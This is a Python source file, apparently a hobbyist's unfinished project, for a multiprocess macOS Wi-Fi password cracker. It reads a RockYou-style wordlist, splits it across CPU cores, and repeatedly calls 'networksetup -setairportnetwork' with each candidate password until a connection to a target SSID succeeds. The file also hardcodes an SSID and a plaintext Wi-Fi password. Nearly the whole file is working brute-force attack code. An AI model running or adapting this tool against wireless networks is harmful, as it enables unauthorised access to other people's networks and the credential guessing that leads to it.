#import argparse # parsing to the command line

# INCOMPLETE. need better insights about multiprocessing as well as managing processes and terminating them upon certain conditions like multiprocessing.manager.event.is_set()
#upgrading to work as a multiprocessor operation as of 4/21/22 9:12pm
import os
import subprocess
import multiprocessing
import numpy as np
from time import sleep

# input is the list, n is how many pieces we will split it into
def fragment(input, n):
    for i in range(0, len(input), n):
        yield input[i:i +n]

def decode(data : set):
    returnData = []
    for _ in data:
        temp = _.decode('latin1')
        #data2.add(temp)    # handling data2 as a set...but i cant iterate through a fucking set so i need to either make it an iterator or a list or a dict
        returnData.append(temp)
    return returnData

# should the 'with open() as file' be not included in this function since i dont really want each cpu to open the same file location multiple times
def parsePasswordDB(database : str, ):
    dataLength = 0
    parsedData = set()
    returnData = []
    lastPassword = ""
    #splits input into bite sized chunks
    # PS had to utilize binary parsing because some of the characters in passwords fucked up parsing, so i had to resort to latin1 binary decoding cuz apple cant fucking be normal
    with open(database, 'rb') as file:
        # need to break the list up into segments based on the # of cores the computer can handle
        try:
            for _ in file:
                # only added this if() to test to see if it would sucessfully use this password to get into my wifi
                temp = _[:-1]   # gotta remove the stupid \n, apparently if you do -2 you remove the n and the last letter of the string. the escape character --> \ isnt counted in the str
                #print(temp)
                parsedData.add(temp)
                dataLength += 1
                lastPassword = temp
        except:
            print("stopped at {}, with length: {}".format(lastPassword, dataLength))
            print("failed")
    
    returnData = decode(parsedData)
    return returnData

def netConnect(crack: list, run): #run: multiprocessing.Manager().Event()):
    attempts = 0

    # used to make sure logic worked (still need to weed out hidden bugs)
    #artificalDatabase = ["liverpool", "secret", "11prV1091rqT", "sierra", "1111111"]

    for current_pass in crack:
        attempts += 1
        # temp commented these 2 prints out because it slows program down
        print("attempt number: ", attempts)
        print("password we are about to try: ", current_pass)
        
        #os.system('networksetup -setairportnetwork en0 {} "{}"'.format(ssid, current_pass))
        #processKiller(run)
        errorSeeking = subprocess.run(['networksetup', '-setairportnetwork', 'en0', '{}'.format(ssid), '{}'.format(current_pass)], stdout = subprocess.PIPE, text = True)

        es_String = str(errorSeeking)
        print("SUBPROCESS RESULTS\n", es_String)

        # FIXME this needs to be changed to accomodate multiprocessing
        # do note that this will terminate with Success if the computer enters sleep mode.
        if ("Error:" in es_String):
            print("'Error:' output detected")
            pass
        else:
            run.clear()
            print("Successful connection to network!")
            #processKiller(run)
            #return run.clear()     # temp removed to see if this multiprocess line occuring before multiprocessing is called in code is the issue
            break
#TODO
#might need this to contain the run.is_set() boolean check, and sprinkle this a few spots in netConnect()
def processKiller(run):
    if run.is_set() == False:
        #this might be a HORRIFINGLY BAD WAY to break the processes...
        exit()


if __name__ == '__main__':
    print("*********    Network Craker  ***********")
    bashTest = ""
    processors = os.cpu_count()     # returns # of processors on computer

    print("This is the current working directory: ", os.getcwd())

    #os.system('networksetup -listallhardwareports')

    '''
    NOTE
    os.system('airport -s') # to setup airport on a machine, go to 'https://osxdaily.com/2007/01/18/airport-the-little-known-command-line-wireless-utility/' for guideance

    bashTest = str(subprocess.check_output(['airport', '-s']))

    print(bashTest)
    '''

    ssid = "Ex iPhone"     #'FRVNET1' # "Extell's iPhone XR"
    password = "xrpkzg3qzcchf"

    #os.system('networksetup -setairportnetwork en0 "{}" {}'.format(ssid, password))
    #os.system('networksetup -setairportnetwork en0 BNWiFi NONE')    # Works!


    # https://www.delftstack.com/howto/python/python-open-file-in-different-directory/ when using 'pathlib.Path()' Dont use / instead use \
    # Volumes/Education/CSCI/Prgm\ Langs/Python/advanced/cross\ program\ tests/crack_databases/rockyou.txt
    # sometimes the code wont work because you arent in the right directory fyi

    # exploring __file__ use
    '''
    currentDirectory = __file__ # NOTE this gets the current location of the RUNNING FILE. Extremely useful for when other ppl need to run the program and you need to act on files within the same dir
    print(currentDirectory) # works beautifully
    '''

    database = os.getcwd() + "/crack_databases/MiniRockYou.txt"
    print(database)
    extractedPasswords = []
    dataLength = 0
    lastPassword = ""

    #parse in passwords
    #decode them into latin1
    print("about to parse database")
    temp_a = parsePasswordDB(database)
    print("finished database")

    print("about to convert passwords to np.array form")
    extractedPasswords = np.array(temp_a)
    print("finished turning to np.array")

    #need to fragment password database
    print("about to fragment the list of passwords")
    print("\n\nfirst extracted passwords shape: ",extractedPasswords.shape, "\n\n second its size: ", extractedPasswords.size)
    sleep(3)
    passSegments = list(fragment(extractedPasswords, int(extractedPasswords.shape[0]/processors)+1))
    print("\n\nfirst passSegments shape: ",passSegments.__sizeof__())
    sleep(2)

    print("finished fragmenting password list")

    print("total segments:{},\n\nThese are the segments of group 4\n(aka 5 since counting from 0 up):\n{}".format(len(passSegments), passSegments[4]))

    active_processes = []
    manager = multiprocessing.Manager()
    return_code = manager.dict()    # do i need this?
    run = manager.Event()
    run.set()
    

    #try using the network for each password
    print("about to try multiprocessing!")
    for x in np.arange(0,processors):
        print(">>>>>>>>>need to see what is inside of passSegments[x]:\n",passSegments[x])
        lil_process = multiprocessing.Process(target = netConnect, args = (passSegments[x], run))      #, run))
        active_processes.append(lil_process)
        lil_process.start()
    
    #print("<***>YO ITS TIME TO CHECK run: \n",run.is_set(), " \n<***>")

    
    if run.is_set() == False:
        for current in active_processes:
            current.join()
    



    #os.system('networksetup -setairportnetwork en0 {} "{}"'.format(target, unknown))    # Works!


    #os.system('moo1moo1gas')  # you can add the password response like this